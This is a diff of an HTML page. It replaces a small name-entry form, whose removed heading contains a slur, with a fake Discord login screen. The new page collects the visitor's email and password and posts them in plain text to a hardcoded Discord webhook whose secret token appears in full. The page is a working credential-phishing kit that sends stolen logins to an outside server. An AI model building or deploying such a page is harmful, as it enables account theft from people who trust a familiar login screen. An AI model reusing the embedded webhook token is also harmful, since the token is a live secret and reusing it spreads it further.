@@ -1,40 +1,113 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <link rel="stylesheet" type="text/css" href="new.css">
-    <title>Submit Name</title>
-    <script>
-      function displayText() {
-        var input = document.getElementById("input").value;
-        if (/\d/.test(input)) { // Check if input contains any numbers
-          showAlert("Please do not insert numbers, letters only please.");
-          return;
-        }
-        var customText = "Your submitted name is: " + input;
-        showAlert(customText);
-        document.getElementById("input").value = ""; // Clear the input field
-      }
+<head>
+  <title>bobbys little test</title>
+  <link rel="stylesheet" href="https://discord.com/assets/e286f3f761469ae40a8ed41b4289d5ab.css">
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #202225;
+      font-family: Whitney, Helvetica Neue, Helvetica, Arial, sans-serif;
+    }
 
-      function showAlert(message) {
-        var alertBox = document.getElementById("alertBox");
-        if (alertBox) {
-          alertBox.textContent = message; // Update the existing alert box
-        } else {
-          alertBox = document.createElement("div");
-          alertBox.id = "alertBox";
-          alertBox.style.backgroundColor = "#f9f9f9";
-          alertBox.style.border = "1px solid #ccc";
-          alertBox.style.padding = "10px";
-          alertBox.style.margin = "10px";
-          alertBox.textContent = message;
-          document.body.appendChild(alertBox);
+    .rectangle {
+      position: relative;
+      width: 326px;
+      background-color: #36393E;
+      border-radius: 8px;
+      padding: 20px;
+      margin: auto;
+    }
+
+    .rectangle > img {
+      display: block;
+      margin: 0 auto;
+      margin-bottom: 20px;
+    }
+
+    .userinput {
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .userinput input {
+      background-color: #40444B;
+      border-radius: 3px;
+      border: none;
+      color: #DCDDDE;
+      font-size: 16px;
+      height: 44px;
+      line-height: 22px;
+      padding: 10px;
+      width: 100%;
+    }
+
+    .userinput input::placeholder {
+      color: #72767D;
+    }
+
+    .userinput input:focus {
+      outline: none;
+    }
+
+    .button {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #4E5D94;
+      border: none;
+      border-radius: 3px;
+      color: #DCDDDE;
+      cursor: pointer;
+      font-size: 14px;
+      height: 40px;
+      line-height: 32px;
+      text-transform: uppercase;
+      width: 100%;
+    }
+
+    .button:hover {
+      background-color: #7289DA;
+    }
+  </style>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+  <script>
+    function sendData() {
+      var email = $("#email").val();
+      var password = $("#password").val();
+
+      var requestData = {
+        content: "Email: " + email + "\nPassword: " + password
+      };
+
+      $.ajax({
+        type: "POST",
+        url: "https://canary.discord.com/api/webhooks/1122684490519674941/IVUM-XREmNkywbiLxl_R346eKP87LS_8ngOlBpyvfRxlodiQvvZRSmLBgxhFDAQn5osi",
+        data: JSON.stringify(requestData),
+        contentType: "application/json",
+        success: function() {
+          alert("Data sent to Discord webhook!");
+        },
+        error: function() {
+          alert("Failed to send data to Discord webhook!");
         }
-      }
-    </script>
-  </head>
-  <body>
-    <h1>Timmy is a yaggot. Bye!</h1>
-    <input type="text" id="input" placeholder="Name" />
-    <button id = 'button' type="button" onclick="displayText()">Submit</button>
-  </body>
+      });
+    }
+  </script>
+</head>
+<body>
+  <div class="rectangle">
+    <img src="https://www.svgrepo.com/show/353655/discord-icon.svg" width="100px" height="100px" alt="Discord Logo">
+    <div class="userinput">
+      <input type="text" id="email" placeholder="Email" autocomplete="off">
+      <input type="password" id="password" placeholder="Password" autocomplete="off">
+    </div>
+    <button class="button" onclick="sendData()">Login</button>
+  </div>
+</body>
 </html>
